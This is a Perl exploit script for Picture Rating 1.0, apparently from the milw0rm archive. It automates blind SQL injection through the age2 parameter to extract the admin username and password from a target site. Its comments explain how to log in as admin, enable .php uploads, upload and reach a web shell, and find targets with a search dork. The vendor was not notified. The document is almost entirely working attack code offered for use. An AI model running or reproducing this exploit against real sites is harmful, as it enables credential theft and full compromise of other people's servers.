<html><head><title>Picture Rating 1.0 Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

# -- Picture Rating 1.0 Blind SQL Injection Exploit --

# -Info/Instructions-
# After running this perl script, you will have admin details therefore you will be able to login to the admin area at http://site.com/control/
# ok once you have logged in has admin you can upload a shell, click &quot;edit settings&quot; and under the allowed extensions, add &quot;.php&quot; ok now
# register as a normal user or backup the database and get a existing users and login to the main site and navigate to upload image/photo and choose your shell and click upload
# the shell should successfully upload and now you will see a broken image, right click the broken image icon and get the link, navigate to this link in your browser and thats your shell ;)


# Vendor Not Notified
# Discovered By: t0pP8uZz
# Discovered On: 6 April 2008
# greetz: milw0rm.com, h4ck-y0u.org, ciphercrew!

# inurl:&quot;index.php?cmd=&quot; Latest Pictures hot 

# -- Picture Rating 1.0 Blind SQL Injection Exploit --

use strict;
use LWP::Simple;

print &quot;---------- Picture Rating 1.0 Blind SQL Injection Exploit ----------\n&quot;;
print &quot;-  Discovered &amp;&amp; Coded By: t0pP8uZz                                -\n&quot;;
print &quot;-                                  Discovered On: 6 April 2008     -\n&quot;;
print &quot;-                                                                  -\n&quot;;
print &quot;-   This exploit will perform a automated BLIND SQL attack on ..   -\n&quot;;
print &quot;-   .. the target host which is running the script.                -\n&quot;;
print &quot;--------------------------------------------------------------------\n&quot;;

print &quot;\nEnter URL (ie: http://site.com/): &quot;;
	chomp(my $url=&lt;STDIN&gt;);
	
if(inject_test($url)) {
	print &quot;Injecting.. Please Wait this could take several minutes..\n\n&quot;;
	my $details = blind($url);
	print &quot;Exploit Success! Admin Details: &quot;.$details;
	exit;
}

sub blind {

	my $url    = shift;
	my $res    = undef;
	my $chr    = 48;
	my $substr = 1;
	my $done   = 1;
	
	while($done) {
		my $content = get($url.&quot;/index.php?cmd=11&amp;listpics=Y&amp;age1=13&amp;age2=99 and ascii(substring((SELECT CONCAT(username,0x3a,password,0x5E) FROM admin),&quot;.$substr.&quot;,1))=&quot;.$chr.&quot;/*&quot;);
		
		if($content =~ /Previous/ &amp;&amp; $chr == 94) { $done = 0; }
			elsif($content =~ /Previous/) { $res .= chr($chr); $substr++; $chr = 48; }
				else { $chr++; }
	}
	return $res;
}

sub inject_test {

	my $url     = shift;
	my $true    = get($url.&quot;/index.php?cmd=11&amp;listpics=Y&amp;age1=13&amp;age2=99 and 1=1&quot;);
	my $false   = get($url.&quot;/index.php?cmd=11&amp;listpics=Y&amp;age1=13&amp;age2=99 and 1=2&quot;);
	
	if($true =~ /Previous/ &amp;&amp; $false !~ /Previous/) {
		print &quot;\nTarget Site Vulnerable!\n\n&quot;;
		return 1;
	} else { print &quot;\nTarget Site Not Vulnerable! Exiting..&quot;; exit; }
}

# milw0rm.com [2008-04-05]</pre></html>